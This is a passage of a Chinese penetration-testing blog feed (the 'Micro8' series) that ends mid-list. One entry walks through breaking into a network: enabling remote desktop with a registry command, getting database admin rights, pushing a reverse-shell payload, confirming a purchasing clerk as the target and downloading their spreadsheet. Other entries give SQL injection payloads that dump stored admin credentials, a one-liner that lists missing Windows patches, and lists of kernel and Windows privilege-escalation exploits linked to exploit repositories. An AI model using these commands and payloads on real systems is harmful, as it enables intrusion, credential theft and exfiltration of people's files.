src="../do/media/17ab0b85f64e92e48eaeeb32ef0f83aa.jpg" alt></p><h3 id="4、开启-3389"><a href="#4、开启-3389" class="headerlink" title="4、开启 3389"></a>4、开启 3389</h3><p>对方没有开启远程桌面，开启：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br></pre></td></tr></table></figure><h3 id="5、Get-Admin"><a href="#5、Get-Admin" class="headerlink" title="5、Get Admin"></a>5、Get Admin</h3><p>通过该服务器得到mssql 数据库。得到终端管理权限。</p><p><img src="../do/media/ae7a57c36b08aeb2176945f9e2072e6d.jpg" alt>  </p><p><img src="../do/media/ccc30aaffee18324e722073588b55c9b.jpg" alt></p><h3 id="6、查找目标"><a href="#6、查找目标" class="headerlink" title="6、查找目标"></a>6、查找目标</h3><p>查看在线机器，查找目标人物。  </p><p><img src="../do/media/7e76f878e0182df67f910a01ccfa315c.jpg" alt>  </p><p><img src="../do/media/9906ffaba02adcbfef821163286b9104.jpg" alt></p><h3 id="7、推送-Payload"><a href="#7、推送-Payload" class="headerlink" title="7、推送 Payload"></a>7、推送 Payload</h3><p>推送payload 反弹。  </p><p><img src="../do/media/09d81485119e132856f82757b8418f69.jpg" alt>  </p><p><img src="../do/media/9938674149690d748853a0adf86e8fe3.jpg" alt></p><h3 id="8、目标确认"><a href="#8、目标确认" class="headerlink" title="8、目标确认"></a>8、目标确认</h3><p>确定是否为目标人物：采购员 桌面截图    </p><p><img src="../do/media/545e99d1852fd486c825fc29598b0a0d.jpg" alt>    </p><p><img src="../do/media/04deeea27d64d51d2a0826d5d66b488d.jpg" alt>  </p><h3 id="9、Download"><a href="#9、Download" class="headerlink" title="9、Download"></a>9、Download</h3><p>按照任务 取得该人员的其中一个xls文件  </p><p><img src="../do/media/f67aea48578dce29a104af040d4cbe74.jpg" alt>  </p><p><img src="../do/media/ec0b56268a8689d959c65ca976e3cd90.jpg" alt></p><h3 id="10、Mission-Completed"><a href="#10、Mission-Completed" class="headerlink" title="10、Mission Completed"></a>10、Mission Completed</h3><p>任务完成。</p><p><img src="../do/media/a90bcbaa1e1bb96809cfb8afc4a4dc22.jpg" alt></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3、Delphi代码审计--项目实战1</title>
      <link href="/article/3_Delphi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%981.html"/>
      <url>/article/3_Delphi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1--%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%981.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、Function-amp-Procedure"><a href="#1、Function-amp-Procedure" class="headerlink" title="1、Function &amp; Procedure"></a>1、Function &amp; Procedure</h3><p>  Delphi 把操作数据的方法分成了两种，一种是 function，另一种是 procedure，大致理解为“函数”和“过程”。<br> Procedure 类似 C 语言中的无返回值函数，即 VOID。而 Function 就是 C 语言中的有返回值函数，即没有 Void。  </p><p><img src="../do/media/21e65a213b1774c59d03619cb69683b4.jpg" alt></p><h3 id="2、连接数据库"><a href="#2、连接数据库" class="headerlink" title="2、连接数据库"></a>2、连接数据库</h3><p>程序分为两种连接数据库模式：  </p><p><img src="../do/media/080d91e0679721483224a0d29b818c61.jpg" alt></p><p>无论是本地模式，还是联网模式，都是读取，当前路径的 config.ini 配置文件：<br><font color="red"> （导致敏感信息暴漏，可直连服务器） </font></p><p><img src="../do/media/00335e7c032c10d239df4a1c64a1543e.jpg" alt></p><p>继续跟数据库连接：配合SQL Server数据库，直接带入，可以判断出为明文存储。  </p><p><img src="../do/media/f0281f9b417bfcff8962a51f84f410b3.jpg" alt></p><h3 id="3、config-ini"><a href="#3、config-ini" class="headerlink" title="3、config.ini"></a>3、config.ini</h3><p>config.ini 配置如下：  </p><p><img src="../do/media/7a7ab42ea759160c062a56d2c4f1cc88.jpg" alt></p><h3 id="4、C-S-交互过程"><a href="#4、C-S-交互过程" class="headerlink" title="4、C/S 交互过程"></a>4、C/S 交互过程</h3><p>基于TCP通信，SQL Server通信构架大致如下：<br><font color="red"> （可导致通信过程中抓取明文执行） </font></p><p><img src="../do/media/109415886494f35eb1abb0dc65e1ea4a.jpg" alt></p><h3 id="5、SQL-注入"><a href="#5、SQL-注入" class="headerlink" title="5、SQL 注入"></a>5、SQL 注入</h3><p>代入执行：<font color="red">（导致可拼接sql语句，查询任意语句或者执行命令）</font></p><p><img src="../do/media/f2d2fa55ca7000f6ac4e2a7f35096223.jpg" alt>  </p><p><img src="../do/media/9c7cde20e5b9f00367d3e9e6742795bd.jpg" alt></p><p>部分语句其中如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> memberid,receivecompany</span><br><span class="line"><span class="keyword">from</span> weigh <span class="keyword">where</span> receivecompany <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">and</span> receivecompany <span class="keyword">like</span> <span class="string">''</span>%<span class="string">'+xxxxxx+'</span>%<span class="string">''</span></span><br></pre></td></tr></table></figure><h3 id="6、Client"><a href="#6、Client" class="headerlink" title="6、Client"></a>6、Client</h3><p>软件呈现如下：  </p><p><img src="../do/media/fb920104b40786b665ab4f54efcc7f45.jpg" alt></p><h3 id="7、构造-SQL-语句"><a href="#7、构造-SQL-语句" class="headerlink" title="7、构造 SQL 语句"></a>7、构造 SQL 语句</h3><p>对应收货单位编号，以及收货单位名称。分别为：<code>memberid</code>, <code>receivecompany</code>。闭合语句为：  </p><pre><code class="sql">2' ; <span class="keyword">select</span> loginid <span class="keyword">as</span> memberid , <span class="keyword">password</span> <span class="keyword">as</span> receivecompany <span class="keyword">from</span> sysuser <span class="comment">--</span></code></pre><p><img src="../do/media/3fe1f0dff1f17524e03aa152e59172b2.jpg" alt></p><p>抓取返回如图：  </p><ul><li>得到admin 账号以及密码。  </li></ul><p><img src="../do/media/0832ba025e9189a7099cd2e4dc368152.jpg" alt></p><ul><li>构造读取远程桌面端口号：得到远程服务器端口号  </li></ul><pre><code class="sql">2' ; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp','PortNumber' <span class="comment">--</span></code></pre><h3 id="8、获取缓冲区内容"><a href="#8、获取缓冲区内容" class="headerlink" title="8、获取缓冲区内容"></a>8、获取缓冲区内容</h3><p>copy 获取缓冲区内容：<font color="red"> （导致可从服务器端构造代码）</font>  </p><p><img src="../do/media/12eae8dd1c87a5e9f14244f5c7b4eb70.jpg" alt></p><p>copy 用法如下：</p><blockquote><p>copy（a,b,c);<br>a：就是copy源，就是一个字符串，表示你将要从a里copy一些东西;<br>b：从a中的第b位开始copy（包含第11位）;<br>c：copy从第b位开始后的c个字符，<br>exp： m:=‘the test fuck’<br>     s：=copy（m,2,2）； //s值为‘he’</p></blockquote><p>当超出范围，会发生异常错误。实例中，从服务器数据库获取数据后进行 copy。</p><p>软件登陆部分代码如下：<font color="red">（导致可自动化跑 loginid。）</font>    </p><p><img src="../do/media/24734f4bbaa74f862cfbcac3b53faf83.jpg" alt></p><p>多次尝试错误处理如下：退出软件，并且重新开始计算。   </p><p><img src="../do/media/4ec9526c01770e2d5f17c9cc9a76b26b.jpg" alt></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2、Linux提权-依赖exp篇</title>
      <link href="/article/2_Linux%E6%8F%90%E6%9D%83-%E4%BE%9D%E8%B5%96exp%E7%AF%87.html"/>
      <url>/article/2_Linux%E6%8F%90%E6%9D%83-%E4%BE%9D%E8%B5%96exp%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<h3 id="exp注："><a href="#exp注：" class="headerlink" title="exp注："></a>exp注：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)</span><br><span class="line">CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]</span><br><span class="line">CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4/4.5.10/4.4.14)</span><br><span class="line">CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)</span><br><span class="line">CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)</span><br><span class="line">CVE-2017-5123 [&apos;waitid()&apos;] (Kernel 4.14.0-rc4+)</span><br><span class="line">CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)</span><br><span class="line">CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))</span><br><span class="line">CVE-2016-2384 [a double-free in USB MIDI driver]  (Linux kernel before 4.5)</span><br><span class="line">CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)</span><br><span class="line">CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)</span><br><span class="line">CVE-2014-5284 [OSSEC] (2.8)</span><br><span class="line">CVE-2014-4699 [ptrace] (before 3.15.4)</span><br><span class="line">CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)</span><br><span class="line">CVE-2014-3153 [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)</span><br><span class="line">CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)</span><br><span class="line">CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)</span><br><span class="line">CVE-2013-1858 [clown-newuser] (3.3-3.8)</span><br><span class="line">CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)</span><br><span class="line">CVE-2013-0268 [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)</span><br><span class="line">CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)</span><br><span class="line">CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)</span><br><span class="line">CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)</span><br><span class="line">CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)</span><br><span class="line">CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)</span><br><span class="line">CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)</span><br><span class="line">CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)</span><br><span class="line">CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)</span><br><span class="line">CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)</span><br><span class="line">CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)</span><br><span class="line">CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)</span><br><span class="line">CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)</span><br><span class="line">CVE-2004-1235 [elflbl] (2.4.29)</span><br><span class="line">CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</span><br></pre></td></tr></table></figure><h3 id="已对外公开-exp-注："><a href="#已对外公开-exp-注：" class="headerlink" title="已对外公开 exp 注："></a>已对外公开 exp 注：</h3><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a><br><a href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/" target="_blank" rel="noopener">https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/</a><br><a href="https://github.com/xairy/kernel-exploits" target="_blank" rel="noopener">https://github.com/xairy/kernel-exploits</a></p><p align="right">--By  Micropoor </p>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1、windows提权-快速查找exp</title>
      <link href="/article/1_windows%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEexp.html"/>
      <url>/article/1_windows%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEexp.html</url>
      
        <content type="html"><![CDATA[<h3 id="微软官方时刻关注列表网址："><a href="#微软官方时刻关注列表网址：" class="headerlink" title="微软官方时刻关注列表网址："></a>微软官方时刻关注列表网址：</h3><p><del><a href="https://technet.microsoft.com/zh-cn/library/security/dn639106.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/library/security/dn639106.aspx</a></del><br>地址更新为：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p><p><img src="../do/media/dff0648ea3163cbe403c144932470520.jpg" alt></p><p>比如常用的几个已公布的 exp：</p><ul><li>KB2592799</li><li>KB3000061</li><li>KB2592799</li><li>…</li></ul><p>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。<br>命令行下执行检测未打补丁的命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> ( KB977165 KB2160329 KB2503665 KB2592799</span><br><span class="line">KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904</span><br><span class="line">KB3134228 KB3143141 KB3141780 ) <span class="keyword">do</span> @type micropoor.txt|@find /i</span><br><span class="line"><span class="string">"%i"</span>|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt</span><br></pre></td></tr></table></figure><p><strong>注：</strong>以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>一般实战中在类似 <code>tmp</code> 目录等可写目录下执行：如 <code>C:\tmp&gt;</code></p><p>以 <code>11-080</code> 为例：<br><img src="../do/media/3b63ae0a14a9720140246f049ed8ab41.jpg" alt></p><p><img src="../do/media/b0f61077ab0e9fd3adeed9eafc0860c6.jpg" alt></p><p><img src="../do/media/bd807d9aabc43114610a6acee7338a78.jpg" alt></p><h3 id="exp注："><a href="#exp注：" class="headerlink" title="exp注："></a>exp注：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8)</span><br><span class="line">CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008）</span><br><span class="line">CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008)</span><br><span class="line">MS17-010 [<span class="string">KB4013389</span>] [<span class="string">Windows Kernel Mode Drivers</span>](<span class="link">windows 7/2008/2003/XP</span>)</span><br><span class="line">MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)</span><br><span class="line">MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1)</span><br><span class="line">MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)</span><br><span class="line">MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012)</span><br><span class="line">MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012)</span><br><span class="line">MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012)</span><br><span class="line">MS16-016 [KB3136041] [WebDAV] (2008/Vista/7)</span><br><span class="line">MS15-097 [KB3089656] [remote code execution] (win8.1/2012)</span><br><span class="line">MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012)</span><br><span class="line">MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012)</span><br><span class="line">MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012)</span><br><span class="line">MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012)</span><br><span class="line">MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8)</span><br><span class="line">MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2)</span><br><span class="line">MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8)</span><br><span class="line">MS14-070 [KB2989935] [Kernel Driver] (2003)</span><br><span class="line">MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8)</span><br><span class="line">MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8)</span><br><span class="line">MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8)</span><br><span class="line">MS14-002 [KB2914368] [NDProxy] (2003/XP)</span><br><span class="line">MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7)</span><br><span class="line">MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7)</span><br><span class="line">MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8)</span><br><span class="line">MS12-042 [KB2972621] [Service Bus] (2008/2012/win7)</span><br><span class="line">MS12-020 [KB2671387] [RDP] (2003/2008/7/XP)</span><br><span class="line">MS11-080 [KB2592799] [AFD.sys] (2003/XP)</span><br><span class="line">MS11-062 [KB2566454] [NDISTAPI] (2003/XP)</span><br><span class="line">MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP)</span><br><span class="line">MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista)</span><br><span class="line">MS10-092 [KB2305420] [Task Scheduler] (2008/7)</span><br><span class="line">MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5)</span><br><span class="line">MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista)</span><br><span 